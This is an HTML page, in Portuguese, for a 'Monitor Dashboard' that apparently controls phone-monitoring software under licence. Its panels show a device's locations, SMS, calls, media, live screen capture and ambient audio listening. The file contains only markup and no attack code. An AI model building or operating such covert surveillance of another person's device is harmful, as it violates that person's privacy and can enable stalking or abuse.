<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <title>Dashboard - Monitor System</title>
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <link rel="stylesheet" href="/css/style.css" />
  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
</head>
<body>
  <header>
    <h1>Monitor Dashboard</h1>
    <div id="userBox"></div>
    <div id="licenseBox"></div>
    <button id="btnLogout" type="button">Sair</button>
  </header>

  <main>
    <aside class="sidebar">
      <button id="btnLocations" type="button">Localizações</button>
      <button id="btnSms" type="button">Mensagens</button>
      <button id="btnCalls" type="button">Chamadas</button>
      <button id="btnMedia" type="button">Mídia</button>
      <button id="btnScreenCapture" type="button">Captura de Tela</button>
      <button id="btnProductKey" type="button">Inserir Product Key</button>
    </aside>

    <section class="content">
      <div id="panel-locations" class="panel">
        <h2>Localizações</h2>
        <div id="map" style="height:400px"></div>
        <ul id="locList"></ul>
      </div>

      <div id="panel-audio-capture" class="panel hidden">
        <h2>Escuta Ambiente</h2>
        <audio id="audioCapture" controls autoplay></audio>
      </div>

      <div id="panel-sms" class="panel hidden"><h2>SMS</h2><ul id="smsList"></ul></div>
      <div id="panel-calls" class="panel hidden"><h2>Chamadas</h2><ul id="callList"></ul></div>
      <div id="panel-media" class="panel hidden"><h2>Mídia</h2><ul id="mediaList"></ul></div>

      <div id="panel-screen-capture" class="panel hidden">
        <h2>Captura de Tela</h2>
        <video id="screenCapture" width="100%" height="400" controls autoplay muted></video>
      </div>
    </section>
  </main>

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script src="/socket.io/socket.io.js"></script>
<script src="/js/socket.js"></script>
<script src="/js/dashboard.js"></script>
</body>
</html>
